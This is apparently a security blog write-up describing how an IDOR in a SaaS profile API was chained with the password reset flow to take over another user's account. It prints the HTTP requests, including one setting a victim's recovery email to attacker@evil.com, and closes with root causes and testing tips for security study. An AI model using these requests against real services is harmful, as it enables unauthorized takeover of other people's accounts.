---
title: "IDOR to Account Takeover: Chaining Broken Access Control"
date: "2026-04-20"
thumbnail: "/assets/img/thumbnail/post-idor-to-account-takeover.png"
tags:
    - web
    - idor
    - broken-access-control
    - api
---

## Overview

Insecure Direct Object References (IDOR) are one of the most common and impactful vulnerabilities in modern web applications. This post walks through a scenario where an IDOR in a profile update endpoint was chained with the password reset flow to achieve full account takeover — without ever knowing the victim's password.

---

## The Target

A SaaS application with a REST API. After registering an account, the first thing I did was intercept all traffic during normal usage to map the API surface.

---

## Step 1 — Mapping the API

Burp Suite's proxy captures everything. After authenticating and navigating around the app, I had a list of endpoints:

```
GET    /api/v1/users/1234/profile
POST   /api/v1/users/1234/profile
POST   /api/v1/users/1234/email/change
POST   /api/v1/auth/password-reset/request
POST   /api/v1/auth/password-reset/confirm
```

The user ID `1234` was mine. The `/profile` endpoint caught my eye.

---

## Step 2 — Testing the IDOR

I sent my profile update request to Burp Repeater and changed the user ID:

```http
POST /api/v1/users/1235/profile HTTP/1.1
Host: target.com
Authorization: Bearer eyJ...my_token...
Content-Type: application/json

{
  "displayName": "test"
}
```

Response:

```json
{"status": "ok", "message": "Profile updated."}
```

No authorization check. I could modify any user's profile data by incrementing the ID.

---

## Step 3 — Finding the Escalation Path

Profile updates alone are limited. But the endpoint accepted more fields than the UI exposed. I checked the `GET` response to see all available fields:

```json
{
  "id": 1235,
  "displayName": "Jane Doe",
  "email": "jane@example.com",
  "recoveryEmail": "",
  "phone": ""
}
```

The `recoveryEmail` field was writable. The password reset flow sent a link to whichever email was set as the recovery email if the primary was unavailable.

---

## Step 4 — The Chain

1. **Set my attacker email as the victim's recovery email** via the IDOR:

```http
POST /api/v1/users/1235/profile HTTP/1.1

{
  "recoveryEmail": "attacker@evil.com"
}
```

2. **Trigger a password reset** for the victim's account:

```http
POST /api/v1/auth/password-reset/request HTTP/1.1

{"email": "jane@example.com", "useRecovery": true}
```

3. **Receive the reset link** at `attacker@evil.com`, set a new password, log in as Jane.

Full account takeover. No brute force, no phishing.

---

## Why This Happens

- The backend validated the JWT but never verified that the `userId` in the token matched the `userId` in the URL
- The `recoveryEmail` field was treated like any other profile field — no additional authorization
- The password reset flow trusted the stored recovery email without re-validating ownership

---

## Takeaways

When testing APIs, always:

1. Map every field in every response — not just what the UI shows
2. Test object references in URL parameters *and* request bodies
3. Think about what writable fields connect to sensitive flows (email change, password reset, 2FA)
4. Trace the full impact — IDOR that writes `displayName` is P4, IDOR that controls email recovery is P1
